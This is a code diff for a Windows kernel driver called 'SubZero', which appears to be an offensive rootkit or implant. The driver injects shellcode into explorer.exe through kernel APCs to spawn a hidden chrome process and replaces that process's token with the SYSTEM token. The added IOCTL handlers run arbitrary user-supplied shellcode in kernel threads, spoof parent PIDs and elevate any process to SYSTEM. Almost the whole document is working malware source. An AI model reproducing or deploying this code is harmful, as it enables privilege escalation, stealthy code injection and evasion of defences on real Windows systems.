@@ -1,25 +1,15 @@
 #include "pch.h"
 #include "SubZero.h"
 
-Globals g_Globals;
-DRIVER_UNLOAD SubZeroUnload;
-DRIVER_DISPATCH SubZeroCreateClose;
-NTSTATUS OnRegistryNotify(PVOID CallbackContext, PVOID Argument1, PVOID Argument2);
-OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info);
-void OnProcessNotify(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo);
-void OnThreadNotify(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create);
-void InjectUsermodeShellcodeAPC(unsigned char* Shellcode, SIZE_T ShellcodeSize);
-bool FindProcessByName(char* Name, PEPROCESS* Process);
-bool QueueAPC(PKTHREAD thread, KPROCESSOR_MODE mode, PKNORMAL_ROUTINE apcFunction);
-void ReplaceTokenToSystem(PEPROCESS Process, PACCESS_TOKEN Token);
-
 extern "C" NTSTATUS
 DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
+	UNREFERENCED_PARAMETER(DriverObject);
+	
 	KdPrint((DRIVER_PREFIX "[+] Driver was loaded\n"));
 
 	UNICODE_STRING altitude = RTL_CONSTANT_STRING(L"12345.6171");
-
-	// Build registration structures for shell Process' protection
+	
+	// Build registration structures for chrome Process' protection
 	OB_OPERATION_REGISTRATION operations[] = {
 		{
 			PsProcessType,		        // object type
@@ -30,7 +20,7 @@ DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 	OB_CALLBACK_REGISTRATION reg = {
 		OB_FLT_REGISTRATION_VERSION,
 		1,										// operation count
-		altitude,		// altitude
+		altitude,								// altitude
 		nullptr,							    // context
 		operations
 	};
@@ -95,27 +85,25 @@ DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
 	LARGE_INTEGER interval;
 	interval.QuadPart = -50000000; // 5 Seconds / 100 nanoseconds - in RELATIVE time
 	do {
-		if (::FindProcessByName(PARENT_PROCESS_NAME, &explorerProcess)) {
+		if (NT_SUCCESS(FindProcessByName(PARENT_PROCESS_NAME, &explorerProcess))) {
 			g_Globals.ExplorerPID = ::HandleToULong(::PsGetProcessId(explorerProcess));
 			KdPrint((DRIVER_PREFIX "[+] explorer.exe found. PID: %d\n", g_Globals.ExplorerPID));
-			//ChangeVadEntryProtection(explorerProcess, NULL, 0);
 			break;
 		}
-		else { 
-			KdPrint((DRIVER_PREFIX "[-] explorer.exe not found. Trying again in 5 seconds\n"));
-			::KeDelayExecutionThread(KernelMode, false, &interval); }
+		KdPrint((DRIVER_PREFIX "[-] explorer.exe not found. Trying again in 5 seconds\n"));
+		::KeDelayExecutionThread(KernelMode, false, &interval); 
 	} while (true);
 
-	//::InterlockedExchange((volatile LONG*)((uintptr_t)explorerProcess + 0x3e8) , 1);
-	//KdPrint((DRIVER_PREFIX "[+] explorer.exe PID changed.")); 
-
 	DriverObject->DriverUnload = SubZeroUnload;
-	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverObject->MajorFunction[IRP_MJ_CLOSE] = SubZeroCreateClose;
+	DriverObject->MajorFunction[IRP_MJ_CREATE] = SubZeroCreateClose;
+	DriverObject->MajorFunction[IRP_MJ_CLOSE] = SubZeroCreateClose;
+	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = SubZeroDeviceControl;
+	
 	return status;
 }
 
-void SubZeroUnload(PDRIVER_OBJECT DriverObject) {
-	
+void SubZeroUnload(PDRIVER_OBJECT DriverObject)
+{	
 	// Unregister Process & Thread notifications in case of an error
 	::PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, TRUE);
 	::PsRemoveCreateThreadNotifyRoutine(OnThreadNotify);
@@ -142,11 +130,199 @@ NTSTATUS SubZeroCreateClose(PDEVICE_OBJECT, PIRP Irp) {
 	return STATUS_SUCCESS;
 }
 
+NTSTATUS SubZeroDeviceControl(PDEVICE_OBJECT, PIRP Irp)
+{
+	auto* const stack = IoGetCurrentIrpStackLocation(Irp);
+	auto const controlCode = stack->Parameters.DeviceIoControl.IoControlCode;
+	NTSTATUS status = STATUS_NOT_SUPPORTED;
+
+	// Can be changed per control code. Default is 0
+	Irp->IoStatus.Information = 0;
+
+	if (nullptr != Irp)
+	{
+		// Run the corresponding handler for the request:
+		switch (controlCode) {
+		case IOCTL_SUBZERO_EXECUTE_SHELLCODE:
+			status = ExecuteShellcode_ControlCodeHandler(Irp, stack);
+			break;
+
+		case IOCTL_SUBZERO_SET_PPID:
+			status = SetParentPID_ControlCodeHandler(Irp, stack);
+			break;
+
+		case IOCTL_SUBZERO_SET_TOKEN_TO_SYSTEM:
+			status = SetTokenToSystem_ControlCodeHandler(Irp, stack);
+			break;
+
+		default:
+			status = STATUS_INVALID_DEVICE_REQUEST;
+			break;
+		}
+	}
+
+	// Complete request
+	Irp->IoStatus.Status = status;
+	IoCompleteRequest(Irp, 0);
+	return status;
+}
+
+NTSTATUS ExecuteShellcode_ControlCodeHandler(_In_ PIRP Irp, _In_ PIO_STACK_LOCATION StackLocation)
+{
+	KdPrint((DRIVER_PREFIX "[+] ExecuteShellcode handler invoked\n"));
+
+	if (sizeof(SubZeroExecuteShellcodeData) > StackLocation->Parameters.DeviceIoControl.InputBufferLength)
+		return STATUS_BUFFER_TOO_SMALL;
+
+	__try
+	{
+		auto* buffer = static_cast<SubZeroExecuteShellcodeData*>(Irp->AssociatedIrp.SystemBuffer);
+		if (sizeof(SubZeroExecuteShellcodeData) + buffer->ShellcodeSize > StackLocation->Parameters.DeviceIoControl.InputBufferLength)
+			return STATUS_BUFFER_TOO_SMALL;
+				
+		auto* const returnedDataAddress = ::ExAllocatePoolWithTag(NonPagedPool, buffer->ReturnedDataMaxSize, DRIVER_TAG);
+		if (nullptr == returnedDataAddress) {
+			KdPrint((DRIVER_PREFIX "[-] Error allocating returned data space\n"));
+			return STATUS_INSUFFICIENT_RESOURCES;
+		}
+
+		PicParameters picParameters
+		{
+			MmGetSystemRoutineAddress,
+			returnedDataAddress,
+			buffer->ReturnedDataMaxSize
+		};
+		
+		auto* const picAddress = ::ExAllocatePoolWithTag(NonPagedPool, buffer->ShellcodeSize, DRIVER_TAG);
+		if (nullptr == picAddress) {
+			KdPrint((DRIVER_PREFIX "[-] Error allocating PIC space\n"));
+			return STATUS_INSUFFICIENT_RESOURCES;
+		}
+		
+		::RtlCopyMemory(picAddress, reinterpret_cast<PCHAR>(buffer) + buffer->ShellcodeOffset, buffer->ShellcodeSize);
+
+		auto const pic = static_cast<PicFunction>(picAddress);
+
+		HANDLE threadHandle;
+		auto status = ::PsCreateSystemThread(
+			&threadHandle, 
+			THREAD_ALL_ACCESS, 
+			nullptr, 
+			nullptr, 
+			nullptr,
+			pic, 
+			&picParameters);
+		if (!NT_SUCCESS(status))
+			return status;
+
+		PVOID threadObject;
+		status = ::ObReferenceObjectByHandle(
+			threadHandle,
+			THREAD_ALL_ACCESS,
+			nullptr,
+			KernelMode,
+			&threadObject,
+			nullptr);
+		if (!NT_SUCCESS(status))
+			return status;
+		
+		status = ::KeWaitForSingleObject(
+			threadObject,
+			Executive,
+			KernelMode,
+			FALSE,
+			nullptr);
+		if (!NT_SUCCESS(status))
+			return status;
+
+		// Copy returned data to user buffer
+		::RtlCopyMemory(Irp->AssociatedIrp.SystemBuffer, picParameters.ReturnedDataAddress, buffer->ReturnedDataMaxSize);
+
+		// Set returned data buffer size
+		Irp->IoStatus.Information = picParameters.ReturnedDataMaxSize;
+
+		// Free PIC memory
+		::ExFreePoolWithTag(returnedDataAddress, DRIVER_TAG);
+		::ExFreePoolWithTag(picAddress, DRIVER_TAG);
+
+		return STATUS_SUCCESS;
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER)
+	{
+		return STATUS_INTERNAL_ERROR;
+	}		
+}
+
+NTSTATUS SetParentPID_ControlCodeHandler(_In_ PIRP Irp, _In_ PIO_STACK_LOCATION StackLocation)
+{
+	KdPrint((DRIVER_PREFIX "[+] SetParentPID handler invoked\n"));
+
+	if (sizeof(SubZeroChangePPIDData) > StackLocation->Parameters.DeviceIoControl.InputBufferLength) 
+		return STATUS_BUFFER_TOO_SMALL;		
+	
+	__try
+	{
+		auto* buffer = static_cast<SubZeroChangePPIDData*>(Irp->AssociatedIrp.SystemBuffer);
+		auto* const processHandle = ::ULongToHandle(buffer->ProcessID);
+		if (nullptr == processHandle) 
+			return STATUS_INVALID_PARAMETER;
+
+		if (nullptr == ::ULongToHandle(buffer->NewParentID)) 
+			return STATUS_INVALID_PARAMETER;
+
+		PEPROCESS process;
+		const auto status = ::PsLookupProcessByProcessId(processHandle, &process);
+		if (!NT_SUCCESS(status))
+			return status;
+
+		// Change PPID value
+		::InterlockedExchange(reinterpret_cast<volatile LONG*>(reinterpret_cast<uintptr_t>(process) + EPROCESS_PARENT_PID), buffer->NewParentID);
+		
+		return STATUS_SUCCESS;		
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER)
+	{
+		return STATUS_INTERNAL_ERROR;
+	}
+}
+
+NTSTATUS SetTokenToSystem_ControlCodeHandler(_In_ PIRP Irp, _In_ PIO_STACK_LOCATION StackLocation)
+{
+	KdPrint((DRIVER_PREFIX "[+] SetTokenToSystem handler invoked\n"));
+
+	if (sizeof(SubZeroSetTokenToSystemData) > StackLocation->Parameters.DeviceIoControl.InputBufferLength)
+		return STATUS_BUFFER_TOO_SMALL;		
+	
+	__try
+	{
+		auto* pid = static_cast<SubZeroSetTokenToSystemData*>(Irp->AssociatedIrp.SystemBuffer);
+		auto* const processHandle = ::ULongToHandle(*pid);
+		if (nullptr == processHandle) 
+			return STATUS_INVALID_PARAMETER;
+		
+		PEPROCESS process;
+		auto status = ::PsLookupProcessByProcessId(processHandle, &process);
+		if (!NT_SUCCESS(status))
+			return status;
+		
+		auto* const token = ::PsReferencePrimaryToken(process);		// Get the process token										
+		status = SetTokenToSystem(process, token);							// Replace the process token with system token		
+		::ObDereferenceObject(token);										// Dereference the process token
+
+		return status;
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER)
+	{
+		return STATUS_INTERNAL_ERROR;
+	}
+}
+
 NTSTATUS OnRegistryNotify(PVOID, PVOID Argument1, PVOID Argument2) {
 	REG_DELETE_VALUE_KEY_INFORMATION* deleteValueInfo;
 	PCUNICODE_STRING name;
 
-	switch ((REG_NOTIFY_CLASS)(ULONG_PTR)Argument1) {
+	switch ((REG_NOTIFY_CLASS)(ULONG_PTR)Argument1)
+	{
 	case RegNtPreDeleteValueKey:
 
 		deleteValueInfo = (REG_DELETE_VALUE_KEY_INFORMATION*)Argument2;			
@@ -172,9 +348,11 @@ OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID, POB_PRE_OPERATION_INFORMATION I
 	if (Info->KernelHandle)
 		return OB_PREOP_SUCCESS;
 
-	auto process = (PEPROCESS)Info->Object;
-	auto pid = ::HandleToULong(::PsGetProcessId(process));
-	if (pid == g_Globals.ChromePID) {
+	auto* const process = static_cast<PEPROCESS>(Info->Object);
+	auto const pid = ::HandleToULong(::PsGetProcessId(process));
+	
+	if (pid == g_Globals.ChromePID) 
+	{
 		//  Remove terminate access
 		Info->Parameters->CreateHandleInformation.DesiredAccess &=
 			~PROCESS_TERMINATE;
@@ -182,41 +360,44 @@ OB_PREOP_CALLBACK_STATUS OnPreOpenProcess(PVOID, POB_PRE_OPERATION_INFORMATION I
 	return OB_PREOP_SUCCESS;
 }
 
-void OnThreadNotify(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create) {
+void OnThreadNotify(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create)
+{
 	// Thread creation only
 	if (!Create) return;
 
 	PETHREAD thread;
-	ULONG pid = ::HandleToULong(ProcessId);
-	ULONG tid = ::HandleToULong(ThreadId);
+	const auto pid = ::HandleToULong(ProcessId);
+	const auto tid = ::HandleToULong(ThreadId);
 
 	// Search for an explorer Thread
 	if (pid == g_Globals.ExplorerPID) {
 
 		// Check if a launcher Thread was already found
-		if (g_Globals.ExplorerLauncherThreadID != 0) return;
+		if (g_Globals.ExplorerLauncherThreadID != 0) 
+			return;
 
 		KdPrint((DRIVER_PREFIX "[+] explorer launcher Thread catched. TID: %d\n", tid));
 		g_Globals.ExplorerLauncherThreadID = tid;
 
 		// Register for Process notifications in order to catch the ghost chrome launch
-		auto status = ::PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, FALSE);
+		const auto status = ::PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, FALSE);
 		if (!NT_SUCCESS(status)) {
 			KdPrint((DRIVER_PREFIX "[-] Failed to register Process callback (status=0x%08X)\n", status));
 			return;
 		}
 
 		// Queue APC for chrome creation
-		if (::ExAcquireRundownProtection(&g_Globals.RundownProtection)) {
+		if (::ExAcquireRundownProtection(&g_Globals.RundownProtection)) 
+		{
 			::PsLookupThreadByThreadId(ThreadId, &thread);
-			if (!QueueAPC(thread, KernelMode, [](PVOID, PVOID, PVOID) { InjectUsermodeShellcodeAPC(LaunchChromeShellcode, sizeof(LaunchChromeShellcode)); }))
+			if (!NT_SUCCESS(QueueAPC(thread, KernelMode, [](PVOID, PVOID, PVOID) { InjectUsermodeShellcodeAPC(LaunchChromeShellcode, ARRAYSIZE(LaunchChromeShellcode)); })))
 				::ExReleaseRundownProtection(&g_Globals.RundownProtection);
 		}
 		else KdPrint((DRIVER_PREFIX "[-] Error acquiring rundown protection\n"));
 	}
 	// Search for chrome's first Thread
-	else if (pid == g_Globals.ChromePID) {
-
+	else if (pid == g_Globals.ChromePID)
+	{
 		// Check if the first Thread was already found
 		if (g_Globals.ChromeFirstThreadID != 0) return;
 
@@ -226,32 +407,29 @@ void OnThreadNotify(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create) {
 		// Queue APC for dll loading
 		if (::ExAcquireRundownProtection(&g_Globals.RundownProtection)) {
 			::PsLookupThreadByThreadId(ThreadId, &thread);
-
 			
-			if (!QueueAPC(thread, KernelMode, [](PVOID, PVOID, PVOID) 
-				{
-					PEPROCESS Process;
-					PACCESS_TOKEN Token;
-				
-					Process = ::PsGetCurrentProcess();			// Get current process (i.e. chrome.exe)
-					Token = ::PsReferencePrimaryToken(Process); // Get the process token
-					ReplaceTokenToSystem(Process, Token);		// Replace the process token with system token
-					::ObDereferenceObject(Token);				// Dereference the process token
+			if (!NT_SUCCESS(QueueAPC(thread, KernelMode, [](PVOID, PVOID, PVOID)
+				{				
+					auto* const process = ::PsGetCurrentProcess();			// Get current process (i.e. chrome.exe)
+					auto* const token = ::PsReferencePrimaryToken(process);		// Get the process token
+					SetTokenToSystem(process, token);									// Replace the process token with system token
+					::ObDereferenceObject(token);										// Dereference the process token
 					
 					// Thread and Process creation notification callbacks are not needed anymore
 					::PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, TRUE);
 					::PsRemoveCreateThreadNotifyRoutine(OnThreadNotify);
 
 					// Now inject the shellcode
-					InjectUsermodeShellcodeAPC(LoadLibraryShellcode, sizeof(LoadLibraryShellcode));
-			}))
+					InjectUsermodeShellcodeAPC(LoadLibraryShellcode, ARRAYSIZE(LoadLibraryShellcode));
+			})))
 				::ExReleaseRundownProtection(&g_Globals.RundownProtection);			
 		}
 		else KdPrint((DRIVER_PREFIX "[-] Error acquiring rundown protection\n"));
 	}
 }
 
-void OnProcessNotify(PEPROCESS, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo) {
+void OnProcessNotify(PEPROCESS, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo)
+{
 	// Process creation only
 	if (!CreateInfo) return;
 
@@ -266,45 +444,11 @@ void OnProcessNotify(PEPROCESS, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateI
 	}
 }
 
-bool FindProcessByName(char* Name, PEPROCESS* Process)
-{
-	PEPROCESS initialSystemProcess = PsInitialSystemProcess;
-	PEPROCESS currentEntry = initialSystemProcess;
-
-	CHAR imageName[30];
-
-	do
-	{
-		RtlCopyMemory((PVOID)(&imageName), (PVOID)((uintptr_t)currentEntry + 0x450) /* EPROCESS->ImageFileName */, sizeof(imageName));
-
-		//KdPrint((DRIVER_PREFIX "[*] %s\n", imageName));
-
-		if (strstr(imageName, Name))
-		{
-			ULONG activeThreads;
-			RtlCopyMemory((PVOID)&activeThreads, (PVOID)((uintptr_t)currentEntry + 0x498) /* EPROCESS->ActiveThreads */, sizeof(activeThreads));
-			if (activeThreads)
-			{
-				*Process = currentEntry;
-				return true;
-			}
-		}
-
-		PLIST_ENTRY list = (PLIST_ENTRY)((uintptr_t)(currentEntry) + 0x2F0); // EPROCESS->ActiveProcessLinks
-		currentEntry = (PEPROCESS)((uintptr_t)list->Flink - 0x2F0);  // Same as CONTAINING_RECORD macro
-
-	} while (currentEntry != initialSystemProcess);
-
-	return false;
-
-
-}
-
-bool QueueAPC(PKTHREAD Thread, KPROCESSOR_MODE Mode, PKNORMAL_ROUTINE ApcFunction) {
-	PKAPC apc = (KAPC*)ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), DRIVER_TAG);
-	if (!apc) {
+NTSTATUS QueueAPC(PKTHREAD Thread, KPROCESSOR_MODE Mode, PKNORMAL_ROUTINE ApcFunction) {
+	auto* apc = static_cast<KAPC*>(::ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), DRIVER_TAG));
+	if (nullptr == apc) {
 		KdPrint((DRIVER_PREFIX "[-] Error allocating KAPC structure\n"));
-		return false;
+		return STATUS_INSUFFICIENT_RESOURCES;
 	}
 
 	::KeInitializeApc(
@@ -312,14 +456,17 @@ bool QueueAPC(PKTHREAD Thread, KPROCESSOR_MODE Mode, PKNORMAL_ROUTINE ApcFunctio
 		Thread,
 		OriginalApcEnvironment,
 		[](PKAPC apc, PKNORMAL_ROUTINE*, PVOID*, PVOID*, PVOID*) {::ExFreePoolWithTag(apc, DRIVER_TAG); }, // Kernel APC
-		[](PKAPC apc) { ::ExFreePoolWithTag(apc, DRIVER_TAG); 
-						::ExReleaseRundownProtection(&g_Globals.RundownProtection); }, // Rundown APC
-		ApcFunction, // Normal APC
+		[](const PKAPC apc)																		   // Rundown APC
+		{
+			::ExFreePoolWithTag(apc, DRIVER_TAG);
+			::ExReleaseRundownProtection(&g_Globals.RundownProtection);
+		}, 
+		ApcFunction,																							   // Normal APC
 		Mode,
 		nullptr
 	);
 
-	auto inserted = ::KeInsertQueueApc(
+	auto const inserted = ::KeInsertQueueApc(
 		apc,
 		nullptr,
 		nullptr,
@@ -329,19 +476,18 @@ bool QueueAPC(PKTHREAD Thread, KPROCESSOR_MODE Mode, PKNORMAL_ROUTINE ApcFunctio
 	if (!inserted) {
 		::ExFreePoolWithTag(apc, DRIVER_TAG);
 		KdPrint((DRIVER_PREFIX "[-] Error inserting APC\n"));
-		return false;
+		return STATUS_INTERNAL_ERROR;
 	}
-	else { 
-		KdPrint((DRIVER_PREFIX "[+] APC queued successfully\n")); 
-		return true;
-	}
+
+	KdPrint((DRIVER_PREFIX "[+] APC queued successfully\n")); 
+	return STATUS_SUCCESS;
 }
 
-void InjectUsermodeShellcodeAPC(unsigned char* Shellcode, SIZE_T ShellcodeSize) {
+void InjectUsermodeShellcodeAPC(const UCHAR* Shellcode, SIZE_T ShellcodeSize) {
 	KdPrint((DRIVER_PREFIX "[+] InjectUsermodeShellcodeAPC invoked\n"));
 
 	SIZE_T pageAlligndShellcodeSize = ShellcodeSize;
-	HANDLE hProcess = ZwCurrentProcess();
+	auto* const hProcess = ZwCurrentProcess();
 
 	// Allocate Shellcode's memory
 	void* address{};
@@ -361,13 +507,13 @@ void InjectUsermodeShellcodeAPC(unsigned char* Shellcode, SIZE_T ShellcodeSize) 
 
 	PMDL mdl;
 	PVOID mappedAddress = nullptr;
-	bool successfull = false;
+	bool successful = false;
 	do
 	{
 		// Allocate MDL
 		mdl = ::IoAllocateMdl(
 			address,
-			(ULONG)pageAlligndShellcodeSize,
+			static_cast<ULONG>(pageAlligndShellcodeSize),
 			false,
 			false,
 			nullptr
@@ -394,11 +540,11 @@ void InjectUsermodeShellcodeAPC(unsigned char* Shellcode, SIZE_T ShellcodeSize) 
 		// Change protection
 		status = ::MmProtectMdlSystemAddress(mdl, PAGE_READWRITE);
 		if (NT_SUCCESS(status))
-			successfull = true;
+			successful = true;
 
 	} while (false);
 
-	if (!successfull) {
+	if (!successful) {
 		if (mdl) {
 			if (mappedAddress) {
 				KdPrint((DRIVER_PREFIX "[-] Error protecting MDL pages\n"));
@@ -414,41 +560,90 @@ void InjectUsermodeShellcodeAPC(unsigned char* Shellcode, SIZE_T ShellcodeSize) 
 	}
 
 	// Copy Shellcode
-	if (int errorCode = ::memcpy_s(mappedAddress, ShellcodeSize, Shellcode, ShellcodeSize)) {
-		KdPrint((DRIVER_PREFIX "[-] Error copying Shellcode to mapped address - (0x%p). Error code: (0x%08X)\n", mappedAddress, errorCode));
-		::ExReleaseRundownProtection(&g_Globals.RundownProtection);
-		return;
+	__try
+	{
+		::RtlCopyMemory(mappedAddress, Shellcode, ShellcodeSize);
+		KdPrint((DRIVER_PREFIX "[+] Shellcode copied to (0x%p). Size: %d bytes\n", address, (int)ShellcodeSize));
 	}
-	KdPrint((DRIVER_PREFIX "[+] Shellcode copied to (0x%p). Size: %d bytes\n", address, (int)ShellcodeSize));
+	__except (EXCEPTION_EXECUTE_HANDLER)
+	{
+		KdPrint((DRIVER_PREFIX "[-] Error copying Shellcode to mapped address - (0x%p)\n", mappedAddress));
+	}
+	
 
 	// Free MDL pages
 	::MmUnmapLockedPages(mappedAddress, mdl);
 	::MmUnlockPages(mdl);
 	::IoFreeMdl(mdl);
 
-	QueueAPC(::KeGetCurrentThread(), UserMode, reinterpret_cast<PKNORMAL_ROUTINE>(address));
+	QueueAPC(::KeGetCurrentThread(), UserMode, static_cast<PKNORMAL_ROUTINE>(address));
 
 	// Kernel APC finished - release RP
 	::ExReleaseRundownProtection(&g_Globals.RundownProtection);
 }
 
-void ReplaceTokenToSystem(PEPROCESS Process, PACCESS_TOKEN Token)
+NTSTATUS FindProcessByName(PCHAR ProcessName, PEPROCESS* Process)
 {
-	PACCESS_TOKEN SystemToken = ::PsReferencePrimaryToken(PsInitialSystemProcess);
-	PULONG_PTR ptr = (PULONG_PTR)Process;
+	auto* const initialSystemProcess = PsInitialSystemProcess;
+	auto* currentEntry = initialSystemProcess;
 
-	// Find the Token member in the EPROCESS structure
+	CHAR imageName[30];
+
+	__try
+	{
+		// Loop on system's process list
+		do
+		{
+			// Compare process name		
+			::RtlCopyMemory(static_cast<PVOID>(&imageName), reinterpret_cast<PVOID>(reinterpret_cast<uintptr_t>(currentEntry) + EPROCESS_IMAGE_FILE_NAME), ARRAYSIZE(imageName));
+			if (::strstr(imageName, ProcessName))
+			{
+				// Check if the process has active threads
+				ULONG activeThreads = 0;
+				::RtlCopyMemory(static_cast<PVOID>(&activeThreads), reinterpret_cast<PVOID>(reinterpret_cast<uintptr_t>(currentEntry) + EPROCESS_ACTIVE_THREADS), sizeof(activeThreads));
+				if (0 != activeThreads)
+				{
+					*Process = currentEntry;
+					return STATUS_SUCCESS;
+				}
+			}
+
+			// Iterate to the next process
+			auto* list = reinterpret_cast<PLIST_ENTRY>(reinterpret_cast<uintptr_t>(currentEntry) + EPROCESS_ACTIVE_PROCESS_LIST);
+			currentEntry = reinterpret_cast<PEPROCESS>(reinterpret_cast<uintptr_t>(list->Flink) - EPROCESS_ACTIVE_PROCESS_LIST);  // Same as CONTAINING_RECORD macro
+
+		} while (currentEntry != initialSystemProcess);
+
+		return STATUS_NOT_FOUND;
+	}
+	__except (EXCEPTION_EXECUTE_HANDLER)
+	{
+		KdPrint((DRIVER_PREFIX "[-] Exception raised in FindProcessByName() \n"));
+		return STATUS_INTERNAL_ERROR;
+	}	
+}
+
+NTSTATUS SetTokenToSystem(PEPROCESS Process, PACCESS_TOKEN Token)
+{
+	NTSTATUS status = STATUS_NOT_FOUND;
+
+	auto systemToken = ::PsReferencePrimaryToken(PsInitialSystemProcess);
+	auto* const processPointer = reinterpret_cast<PULONG_PTR>(Process);
+
 	for (ULONG i = 0; i < 512; i++)
 	{
-		if ((ptr[i] & ~7) == (ULONG_PTR)((ULONG_PTR)Token & ~7))
+		// Locate the Token member in the EPROCESS structure (without RefCount)
+		if ((processPointer[i] & ~7) == (reinterpret_cast<ULONG_PTR>(Token) & ~7))
 		{
 			// Replace the original token with system token
-			ptr[i] = (ULONG_PTR)SystemToken;
+			processPointer[i] = reinterpret_cast<ULONG_PTR>(systemToken);
+			KdPrint((DRIVER_PREFIX "[+] Process token has changed successfully\n"));
+			status = STATUS_SUCCESS;
 			break;
 		}
 	}
 	// Dereference the system token
-	::ObDereferenceObject(SystemToken);
+	::ObDereferenceObject(systemToken);
 
-	KdPrint((DRIVER_PREFIX "[+] Process token has changed successfully\n"));
+	return status;
 }
